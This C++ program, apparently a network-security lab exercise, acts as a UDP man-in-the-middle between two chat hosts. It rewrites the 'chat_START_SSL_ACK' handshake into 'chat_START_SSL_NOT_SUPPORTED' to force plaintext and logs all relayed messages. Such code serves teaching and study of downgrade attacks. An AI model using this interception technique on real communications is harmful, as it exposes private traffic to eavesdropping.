#include<iostream>

#include <netdb.h>
#include<cstring>
#include<arpa/inet.h>
#include<sys/socket.h>
#include <unistd.h>

#include <thread>

#define SPORT 12345
#define SSPORT 1234
#define USPORT 12346
#define buffer_size 1024

using namespace std;


// complete the get_ip_address function using getaddrinfo
char * get_ip_address(char * server_name) {
    struct addrinfo hints;
    struct addrinfo *res;
    int status;
    char * ip_address = (char *)malloc(16);
    memset(&hints, 0, sizeof (hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;

    if ((status = getaddrinfo(server_name, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return NULL;
    }

    struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
    void *addr = &(ipv4->sin_addr);
    inet_ntop(res->ai_family, addr, ip_address, 16);
    return ip_address;
}

// interceptor of messages, pass the udp messages from alice to bob and vice versa
void interceptor(int udp_socket, sockaddr_in server_addr1, sockaddr_in server_addr2, sockaddr_in server_addr2_data) {
    char * server_ip1;
    char * server_ip2;
    string ip1 = inet_ntoa(server_addr1.sin_addr);
    string ip2 = inet_ntoa(server_addr2.sin_addr);

    server_ip1 = (char *)ip1.c_str();
    server_ip2 = (char *)ip2.c_str();

    cout << "Intercepting messages from " << server_ip1 << " and " << server_ip2 << endl;
    int port1 = SPORT;
    int port2 = SPORT;
    char buffer[buffer_size];
    while (true) {
        memset(buffer, 0, buffer_size);
        sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);
        recvfrom(udp_socket, buffer, buffer_size, 0, (struct sockaddr *)&client_addr, &client_addr_len);
        char * ip = inet_ntoa(client_addr.sin_addr);
        cout << "Received message from " << ip << ": " <<"port : "<<ntohs(client_addr.sin_port) <<" "<<buffer << endl;
        if (strcmp(buffer, "chat_START_SSL_ACK\0") == 0) {
            cout << "Intercepted SSL handshake message" << endl;
            memset(buffer, 0, buffer_size);
            strcpy(buffer, "chat_START_SSL_NOT_SUPPORTED\0");
        }
        if (strcmp(ip, server_ip1) == 0) {
            port1 = ntohs(client_addr.sin_port);
            server_addr2.sin_port = htons(port2);
            if(port1 == USPORT)
                server_addr2.sin_port = htons(USPORT);
            port2 = ntohs(client_addr.sin_port);
            cout << "sending to " << server_ip2 << " on port " << port2 << " prev port "<< port1 << endl;
            sendto(udp_socket, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr2, sizeof(server_addr2));
        } else if (strcmp(ip, server_ip2) == 0) {
            port2 = ntohs(client_addr.sin_port);
            server_addr1.sin_port = htons(port1);
            if(port2 == USPORT)
                server_addr2.sin_port = htons(USPORT);
            port1 = ntohs(client_addr.sin_port);
            cout << "sending to " << server_ip1 << " on port " << port1 << " prev port "<< port2 << endl;
            sendto(udp_socket, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr1, sizeof(server_addr1));
        }
    }

}


int main(int argc, char ** args) {
    if (argc < 4) {
        cout << "Usage: " << args[0] << " [-d <hostname1> <hostname2>]" << endl;
        return 1;
    }

    // if args[1] is -d, then we are in the interceptor mode
    if (strcmp(args[1], "-d") == 0) {
        char * server_name1 = args[2];
        char * server_name2 = args[3];
        char * server_ip1;
        char * server_ip2;
        // get the ip address of the server from the hostname
        server_ip1 = get_ip_address(server_name1);
        server_ip2 = get_ip_address(server_name2);
        // create a udp socket to listen to messages from alice
        int udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SPORT);
        server_addr.sin_addr.s_addr = INADDR_ANY;
        bind(udp_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
        sockaddr_in server_addr1;
        server_addr1.sin_family = AF_INET;
        server_addr1.sin_port = htons(SPORT);
        server_addr1.sin_addr.s_addr = inet_addr(server_ip1);

        sockaddr_in server_addr2;
        server_addr2.sin_family = AF_INET;
        server_addr2.sin_port = htons(SPORT);
        server_addr2.sin_addr.s_addr = inet_addr(server_ip2);

        sockaddr_in server_addr2_data;
        server_addr2_data.sin_family = AF_INET;
        server_addr2_data.sin_port = htons(USPORT);
        server_addr2_data.sin_addr.s_addr = inet_addr(server_ip2);
        thread t1(interceptor, udp_socket, server_addr1, server_addr2,server_addr2_data);

        int udp_socket2 = socket(AF_INET, SOCK_DGRAM, 0);
        struct sockaddr_in host_addr;
        host_addr.sin_family = AF_INET;
        host_addr.sin_port = htons(USPORT);
        host_addr.sin_addr.s_addr = INADDR_ANY;

        bind(udp_socket2, (struct sockaddr *)&host_addr, sizeof(host_addr));
        sockaddr_in server_addr3;
        server_addr3.sin_family = AF_INET;
        server_addr3.sin_port = htons(SPORT);
        server_addr3.sin_addr.s_addr = inet_addr(server_ip1);

        sockaddr_in server_addr4;
        server_addr4.sin_family = AF_INET;
        server_addr4.sin_port = htons(SPORT);
        server_addr4.sin_addr.s_addr = inet_addr(server_ip2);

        sockaddr_in server_addr4_data;
        server_addr4_data.sin_family = AF_INET;
        server_addr4_data.sin_port = htons(USPORT);
        server_addr4_data.sin_addr.s_addr = inet_addr(server_ip2);
        thread t2(interceptor, udp_socket2, server_addr3, server_addr4,server_addr4_data);

        t1.join();
        t2.join();

        
    }
    return 0;
}
